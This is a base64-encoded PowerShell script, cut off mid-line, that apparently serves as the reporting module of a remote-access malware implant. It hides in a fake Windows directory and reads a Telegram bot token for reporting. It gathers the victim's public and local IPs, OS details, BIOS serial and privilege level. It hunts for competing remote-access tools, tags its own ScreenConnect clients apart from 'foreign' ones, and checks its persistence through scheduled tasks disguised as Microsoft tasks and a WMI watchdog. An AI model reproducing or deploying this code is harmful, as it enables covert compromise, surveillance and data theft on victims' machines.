ZGVudGl0eS1hd2FyZSB0YXNrcyArIGNvbXBhY3QgZGlnZXN0OyAtRm9yY2Ugb24gaGlkZGVuIGNh
Y2hlOyB3aWRlIG1hcmtlciBmaWx0ZXI7IHBheWxvYWQtYnVpbGQgdmlzaWJpbGl0eQ0KcGFyYW0o
DQogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kU3RhdGUsDQogICAg
W3N0cmluZ10kU3VtbWFyeSA9ICcnLA0KICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3Jh
bURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtzdHJpbmdd
JE9sZFN0YXRlID0gJycsDQogICAgW1ZhbGlkYXRlU2V0KCdyaWNoJywgJ2NvbXBhY3QnKV1bc3Ry
aW5nXSRNb2RlID0gJ3JpY2gnLA0KICAgIFtzdHJpbmddJEJ1aWxkID0gJ08xNScsDQogICAgW3N0
cmluZ10kQ291bnQgPSAnMCcNCikNCg0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRs
eUNvbnRpbnVlJw0KJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KdHJ5
IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2Vj
dXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9DQoNCmZ1bmN0aW9uIEdldC1DZmcg
ew0KICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnkuY2ZnJw0KICAgICRjZmcg
PSBAe30NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRwYXRoKSkgeyByZXR1cm4gJGNmZyB9DQog
ICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
ICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtBLVphLXowLTlfXSspXHMqPVxzKiguKilccyokJykg
ew0KICAgICAgICAgICAgJGNmZ1skbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXS5UcmltKCkNCiAg
ICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGNmZw0KfQ0KDQpmdW5jdGlvbiBFc2MoW3N0cmlu
Z10kcykgew0KICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0NCiAgICByZXR1cm4g
KCRzIC1yZXBsYWNlICcmJywgJyZhbXA7JyAtcmVwbGFjZSAnPCcsICcmbHQ7JyAtcmVwbGFjZSAn
PicsICcmZ3Q7JykNCn0NCg0KZnVuY3Rpb24gR2V0LVB1YmxpY0lwIHsNCiAgICBmb3JlYWNoICgk
dSBpbiBAKA0KICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsDQogICAgICAgICAg
ICAnaHR0cHM6Ly9pZmNvbmZpZy5tZS9pcCcsDQogICAgICAgICAgICAnaHR0cHM6Ly9pY2FuaGF6
aXAuY29tJw0KICAgICAgICApKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkciA9IElu
dm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHUgLVVzZUJhc2ljUGFyc2luZyAtVGltZW91dFNlYyA2DQog
ICAgICAgICAgICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQ0KICAgICAg
ICAgICAgaWYgKCRpcCAtbWF0Y2ggJ15cZHsxLDN9KFwuXGR7MSwzfSl7M30kJyAtb3IgJGlwIC1t
YXRjaCAnOicpIHsgcmV0dXJuICRpcCB9DQogICAgICAgIH0gY2F0Y2gge30NCiAgICB9DQogICAg
cmV0dXJuICduL2EnDQp9DQoNCmZ1bmN0aW9uIEdldC1Mb2NhbElwcyB7DQogICAgdHJ5IHsNCiAg
ICAgICAgJGlwcyA9IEdldC1OZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5J
UEFkZHJlc3MgLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfLlByZWZpeE9yaWdpbiAtbmUgJ1dlbGxL
bm93bicgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBJUEFk
ZHJlc3MgLVVuaXF1ZQ0KICAgICAgICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywg
JykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkaXBzID0gR2V0LUNpbUlu
c3RhbmNlIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJs
ZWQ9VHJ1ZScgfA0KICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyAkXy5JUEFkZHJlc3MgfSB8
IFdoZXJlLU9iamVjdCB7ICRfIC1hbmQgJF8gLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfIC1ub3Rs
aWtlICcqOionIH0NCiAgICAgICAgaWYgKCRpcHMpIHsgcmV0dXJuICgoJGlwcyB8IFNlbGVjdC1P
YmplY3QgLVVuaXF1ZSkgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4g
J24vYScNCn0NCg0KZnVuY3Rpb24gR2V0LU9zSW5mbyB7DQogICAgJG8gPSBbb3JkZXJlZF1Aew0K
ICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24gPSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsg
QXJjaCA9ICduL2EnDQogICAgICAgIERvbWFpbiA9ICduL2EnOyBJbnN0YWxsRGF0ZSA9ICduL2En
OyBMYXN0Qm9vdCA9ICduL2EnDQogICAgICAgIENQVSA9ICduL2EnOyBNYW51ZmFjdHVyZXIgPSAn
bi9hJzsgTW9kZWwgPSAnbi9hJzsgU2VyaWFsID0gJ24vYScNCiAgICAgICAgVG90YWxSQU1fR0Ig
PSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1NpemVfR0IgPSAnbi9hJw0KICAgIH0N
CiAgICB0cnkgew0KICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5n
U3lzdGVtDQogICAgICAgICRvLkNhcHRpb24gPSAkb3MuQ2FwdGlvbg0KICAgICAgICAkby5WZXJz
aW9uID0gJG9zLlZlcnNpb24NCiAgICAgICAgJG8uQnVpbGQgPSAkb3MuQnVpbGROdW1iZXINCiAg
ICAgICAgJG8uQXJjaCA9ICRvcy5PU0FyY2hpdGVjdHVyZQ0KICAgICAgICAkby5JbnN0YWxsRGF0
ZSA9ICgkb3MuSW5zdGFsbERhdGUgfCBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkJykNCiAg
ICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0LURhdGUgLUZvcm1h
dCAneXl5eS1NTS1kZCBISDptbScpDQogICAgICAgICRvLlRvdGFsUkFNX0dCID0gW21hdGhdOjpS
b3VuZCgkb3MuVG90YWxWaXNpYmxlTWVtb3J5U2l6ZSAvIDFNQiwgMSkNCiAgICB9IGNhdGNoIHt9
DQogICAgdHJ5IHsNCiAgICAgICAgJGNzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0NvbXB1dGVy
U3lzdGVtDQogICAgICAgICRvLkRvbWFpbiA9IGlmICgkY3MuUGFydE9mRG9tYWluKSB7ICRjcy5E
b21haW4gfSBlbHNlIHsgJGNzLldvcmtncm91cCB9DQogICAgICAgICRvLk1hbnVmYWN0dXJlciA9
ICRjcy5NYW51ZmFjdHVyZXINCiAgICAgICAgJG8uTW9kZWwgPSAkY3MuTW9kZWwNCiAgICB9IGNh
dGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJG8uQ1BVID0gKEdldC1DaW1JbnN0YW5jZSBXaW4z
Ml9Qcm9jZXNzb3IgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxIC1FeHBhbmRQcm9wZXJ0eSBOYW1l
KQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5TZXJpYWwgPSAoR2V0LUNp
bUluc3RhbmNlIFdpbjMyX0JJT1MpLlNlcmlhbE51bWJlcg0KICAgIH0gY2F0Y2gge30NCiAgICB0
cnkgew0KICAgICAgICAkZCA9IEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Mb2dpY2FsRGlzayAtRmls
dGVyICJEZXZpY2VJRD0nQzonIg0KICAgICAgICAkby5EaXNrRnJlZV9HQiA9IFttYXRoXTo6Um91
bmQoJGQuRnJlZVNwYWNlIC8gMUdCLCAxKQ0KICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRo
XTo6Um91bmQoJGQuU2l6ZSAvIDFHQiwgMSkNCiAgICB9IGNhdGNoIHt9DQogICAgcmV0dXJuICRv
DQp9DQoNCmZ1bmN0aW9uIEdldC1TdmNMaW5lKFtzdHJpbmddJG5hbWUpIHsNCiAgICAkcyA9IEdl
dC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
aWYgKC1ub3QgJHMpIHsgcmV0dXJuICdOT1QgSU5TVEFMTEVEJyB9DQogICAgcmV0dXJuICgnezB9
IChTdGFydD17MX0pJyAtZiAkcy5TdGF0dXMsICRzLlN0YXJ0VHlwZSkNCn0NCg0KZnVuY3Rpb24g
R2V0LVRhc2tIZWFsdGgoW3N0cmluZ10kdG4pIHsNCiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUg
L1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFTVEVYSVRDT0RF
IC1uZSAwIC1vciAtbm90ICRvdXQpIHsNCiAgICAgICAgcmV0dXJuIEB7IFByZXNlbnQgPSAkZmFs
c2U7IFN0YXR1cyA9ICdNSVNTSU5HJzsgTmV4dCA9ICcnOyBMYXN0ID0gJyc7IFJlc3VsdCA9ICcn
IH0NCiAgICB9DQogICAgJG1hcCA9IEB7fQ0KICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsN
CiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbXjpdKyk6XHMqKC4qKVxzKiQnKSB7DQog
ICAgICAgICAgICAkbWFwWyRtYXRjaGVzWzFdLlRyaW0oKV0gPSAkbWF0Y2hlc1syXS5UcmltKCkN
CiAgICAgICAgfQ0KICAgIH0NCiAgICAkc3RhdHVzID0gJG1hcFsnU3RhdHVzJ10NCiAgICBpZiAo
LW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0NCiAgICBpZiAo
LW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAncHJlc2VudCcgfQ0KICAgICRuZXh0ID0gJG1hcFsn
TmV4dCBSdW4gVGltZSddDQogICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9DQogICAg
JGxhc3QgPSAkbWFwWydMYXN0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbGFzdCkgeyAkbGFz
dCA9ICcnIH0NCiAgICAkcmVzdWx0ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQ0KICAgIGlmICgtbm90
ICRyZXN1bHQpIHsgJHJlc3VsdCA9ICcnIH0NCiAgICAkaGVhbHRoeSA9ICgkc3RhdHVzIC1tYXRj
aCAnUmVhZHl8UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKQ0KICAgIHJldHVy
biBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgSGVhbHRoeSA9IFtib29sXSRo
ZWFsdGh5DQogICAgICAgIFN0YXR1cyAgPSAkc3RhdHVzDQogICAgICAgIE5leHQgICAgPSAkbmV4
dA0KICAgICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQNCiAg
ICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAkdG9rZW5zID0gQCgNCiAgICAg
ICAgJ0FueURlc2snLCAnVGVhbVZpZXdlcicsICd0dm5zZXJ2ZXInLCAnRFdBZ2VudCcsICdEV1Nl
cnZpY2UnLCAnTG9nTWVJbicsICdMTUlHdWFyZGlhbicsDQogICAgICAgICdXaW5WTkMnLCAndm5j
c2VydmVyJywgJ3R2XycsICdTcGxhc2h0b3AnLCAnWm9obycsICdSdXN0RGVzaycsICdSZW1vdGVQ
QycsICdEYW1lV2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1N
JywgJ05pbmphT25lJywgJ05pbmphJywgJ0thc2V5YScsICdQdWxzZXdheScsICdTeW5jcm8nLA0K
ICAgICAgICAnU3VwZXJPcHMnLCAnTWFuYWdlRW5naW5lJywgJ1NvbGFyV2luZHMnLCAnQ29ubmVj
dFdpc2UnLCAnTFRTZXJ2aWNlJywgJ0xhYlRlY2gnLA0KICAgICAgICAnQWN0aW9uMScsICdTaW1w
bGVIZWxwJywgJ0JvbWdhcicsICdCZXlvbmRUcnVzdCcsICdNZXNoQWdlbnQnLCAnTWVzaCBDZW50
cmFsJywNCiAgICAgICAgJ1RhY3RpY2FsUk1NJywgJ3RhY3RpY2Fscm1tJywgICAgICAgICAnR2V0
U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywNCiAgICAgICAg
J0Nocm9tZSBSZW1vdGUgRGVza3RvcCcsICdQYXJzZWMnLCAnTmV0U3VwcG9ydCcsICdMZXZlbC5p
bycsICdMZXZlbCBBZ2VudCcsDQogICAgICAgICdEYXR0byBSTU0nLCAnQ29udGludXVtJw0KICAg
ICkNCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlz
dFtzdHJpbmddDQogICAgJHNlZW4gPSBAe30NCg0KICAgIGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmlu
Z10ka2luZCwgW3N0cmluZ10kbmFtZSkgew0KICAgICAgICAka2V5ID0gIiRraW5kfCRuYW1lIi5U
b0xvd2VySW52YXJpYW50KCkNCiAgICAgICAgaWYgKCRzZWVuLkNvbnRhaW5zS2V5KCRrZXkpKSB7
IHJldHVybiB9DQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUNCiAgICAgICAgW3ZvaWRdJGhp
dHMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+JyAtZiAka2luZCwgKEVzYyAkbmFtZSkp
KQ0KICAgIH0NCg0KICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkbiA9ICRfLk5hbWUNCiAgICAgICAgJGQgPSAk
Xy5EaXNwbGF5TmFtZQ0KICAgICAgICBpZiAoJG4gLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50
KicpIHsgcmV0dXJuIH0NCiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2Vucykgew0KICAgICAg
ICAgICAgaWYgKCRuIC1saWtlICIqJHQqIiAtb3IgJGQgLWxpa2UgIiokdCoiKSB7DQogICAgICAg
ICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAg
ICAgICBicmVhaw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgR2V0LVBy
b2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
ICAgICAgICRuID0gJF8uUHJvY2Vzc05hbWUNCiAgICAgICAgaWYgKCRuIC1saWtlICcqU2NyZWVu
Q29ubmVjdConKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsN
CiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAgICAgICAgICAgICBBZGQt
SGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQogICAg
ICAgIH0NCiAgICB9DQoNCiAgICAkdW5pbnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJF
XE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAg
J0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJz
aW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBpbiAkdW5pbnN0KSB7
DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZG4gPSBbc3RyaW5nXSRfLkRp
c3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0dXJuIH0NCiAgICAgICAg
ICAgIGlmICgkZG4gLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuIH0NCiAgICAgICAg
ICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1s
aWtlICIqJHQqIikgew0KICAgICAgICAgICAgICAgICAgICBBZGQtSGl0ICdtc2knICRkbg0KICAg
ICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0N
CiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiAkaGl0cw0KfQ0KDQpmdW5jdGlvbiBHZXQt
U2NJbnN0YWxscyB7DQogICAgJGxpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5H
ZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdCBD
bGllbnQqJyB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkZnAgPSBpZiAoJF8uTmFtZSAt
bWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBlbHNlIHsgJz8nIH0N
CiAgICAgICAgJHRhZyA9IGlmICgkZnAgLWVxICc1ZjYwMTA1Nzk4NTJlNTA3JykgeyAnS0VFUC1Q
UklNQVJZJyB9DQogICAgICAgIGVsc2VpZiAoJGZwIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsg
J0tFRVAtQUxUJyB9DQogICAgICAgIGVsc2UgeyAnRk9SRUlHTicgfQ0KICAgICAgICBbdm9pZF0k
bGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2Mg
JF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQ0KICAgIH0NCg0KICAg
ICRyb290cyA9IEAoDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3Qg
Q2xpZW50KiIsDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVj
dCBDbGllbnQqIg0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0IGluICRyb290cykgew0KICAgICAg
ICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwYXQgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50
bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFk
ZCgoJy0gcGF0aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQ0KICAg
ICAgICB9DQogICAgfQ0KDQogICAgJHVuaW5zdCA9IEAoDQogICAgICAgICdIS0xNOlxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicsDQogICAgICAg
ICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVy
c2lvblxVbmluc3RhbGxcKicNCiAgICApDQogICAgZm9yZWFjaCAoJHBhdGggaW4gJHVuaW5zdCkg
ew0KICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICRfLkRpc3BsYXlOYW1lIC1saWtl
ICcqU2NyZWVuQ29ubmVjdConDQogICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAg
ICAgICAkdmVyID0gaWYgKCRfLkRpc3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0g
ZWxzZSB7ICc/JyB9DQogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIG1zaTogPGNvZGU+
ezB9PC9jb2RlPiB2ezF9JyAtZiAoRXNjICRfLkRpc3BsYXlOYW1lKSwgKEVzYyAkdmVyKSkpDQog
ICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoJGxpc3QuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGxp
c3QuQWRkKCctIChub25lKScpIH0NCiAgICByZXR1cm4gJGxpc3QNCn0NCg0KJGNmZyA9IEdldC1D
ZmcNCmlmICgtbm90ICRjZmcuQk9UX1RPS0VOIC1vciAtbm90ICRjZmcuQ0hBVF9JRCkgew0KICAg
IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicp
IC1WYWx1ZSAndGdfc2tpcF9ub19jZmcnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQog
ICAgZXhpdCAyDQp9DQoNCiRwcmltID0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4
NTJlNTA3KScNCiRhbHQgPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0Mjcp
Jw0KJG9zID0gR2V0LU9zSW5mbw0KJHdobyA9IFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lk
ZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUNCiRlbGV2ID0gKFtTZWN1cml0eS5QcmluY2lwYWwu
V2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06Okdl
dEN1cnJlbnQoKSkuSXNJblJvbGUoDQogICAgW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVp
bHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGlzU3lzdGVtID0gJHdobyAtbGlrZSAnKlNZU1RF
TSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScNCg0KJG1zaUNhY2hlID0gSm9p
bi1QYXRoICRXb3JrRGlyICdwa2cubXNpJw0KJG1zaVNpemUgPSBpZiAoVGVzdC1QYXRoICRtc2lD
YWNoZSkgew0KICAgICd7MDpOMH0gS0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSku
TGVuZ3RoIC8gMUtCKQ0KfSBlbHNlIHsgJ25vbmUnIH0NCg0KJG1vblBhdGggPSBKb2luLVBhdGgg
JFdvcmtEaXIgJ293bl9tb24uY21kJw0KJGV0bE1vbiA9ICIkZW52OlByb2dyYW1EYXRhXE1pY3Jv
c29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlXGV0bF9tb24uY21kIg0KJGhhc01vbiA9IFRl
c3QtUGF0aCAkbW9uUGF0aA0KJGhhc0V0bCA9IFRlc3QtUGF0aCAkZXRsTW9uDQoNCiMgVDEwOiBv
bi1kaXNrIHBheWxvYWQgYnVpbGQgbWFya2VycyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4YWN0
bHkgd2hhdCBpcyBpbnN0YWxsZWQNCmZ1bmN0aW9uIEdldC1QYXlsb2FkQnVpbGQoW3N0cmluZ10k
ZmlsZSkgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGZpbGUpKSB7IHJldHVybiAnbWlzc2lu
ZycgfQ0KICAgIGZvcmVhY2ggKCRsIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZpbGUg
LVRvdGFsQ291bnQgOCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQog
ICAgICAgIGlmICgkbCAtbWF0Y2ggJ0JVSUxEXHMrXGR7OH0oW0EtWl0rXGQrKScpIHsgcmV0dXJu
ICRtYXRjaGVzWzFdIH0NCiAgICB9DQogICAgcmV0dXJuICc/Jw0KfQ0KJGJNb24gPSBHZXQtUGF5
bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJykNCiRiU2VjID0gR2V0
LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fc2VjdXJlLmNtZCcpDQokYlRn
ciA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAndGdfcmVwb3J0LnBzMScp
DQokYkxpYiA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAnb3duX2xpYi5w
czEnKQ0KDQojIHBlci1ob3N0IGlkZW50aXR5OiBleHBlY3RlZCB0YXNrIG5hbWVzIGNvbWUgZnJv
bSBpZGVudGl0eS5jZmcgd2hlbiBwcmVzZW50DQokaWRDZmcgPSBKb2luLVBhdGggJFdvcmtEaXIg
J2lkZW50aXR5LmNmZycNCiRpZE1hcCA9IEB7fQ0KaWYgKFRlc3QtUGF0aCAkaWRDZmcpIHsNCiAg
ICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGlkQ2ZnIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
ICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlk
TWFwWyRtYXRjaGVzWzFdXSA9ICRtYXRjaGVzWzJdIH0NCiAgICB9DQp9DQokZXhwZWN0ZWRUYXNr
cyA9IEAoDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0EpIHsgJGlkTWFwLlRBU0tf
QSB9IGVsc2UgeyAnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnIH0pOyBS
b2xlID0gInRpY2sgJCgkaWRNYXAuTU9fQSltIChjaGFpbjEpIiB9LA0KICAgIEB7IE5hbWUgPSAk
KGlmICgkaWRNYXAuVEFTS19CKSB7ICRpZE1hcC5UQVNLX0IgfSBlbHNlIHsgJ1xNaWNyb3NvZnRc
V2luZG93c1xQTEFcU2VydmVyJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQiltIChj
aGFpbjEpIiB9LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19DKSB7ICRpZE1hcC5U
QVNLX0MgfSBlbHNlIHsgJ1xNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnIH0p
OyBSb2xlID0gJ09OU1RBUlQgKGNoYWluMSknIH0sDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1h
cC5UQVNLX0QpIHsgJGlkTWFwLlRBU0tfRCB9IGVsc2UgeyAnXE1pY3Jvc29mdFxXaW5kb3dzXFRj
cGlwXElwQWRkcmVzc0NvbmZsaWN0MScgfSk7IFJvbGUgPSAnT05MT0dPTiAoY2hhaW4xKScgfQ0K
KQ0KIyBjaGFpbiAyOiBXTUkgd2F0Y2hkb2cgc3Vic2NyaXB0aW9uDQokd21pQyA9IEdldC1XbWlP
YmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVu
dENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQ0KJGV4cGVjdGVkVGFza3MgKz0gQHsgTmFtZSA9ICdcV01JXFd1Y2Fj
aGVXYXRjaGRvZ0MnOyBSb2xlID0gJ3RpbWVyIDNtIChjaGFpbjIpJzsgV21pID0gKCRudWxsIC1u
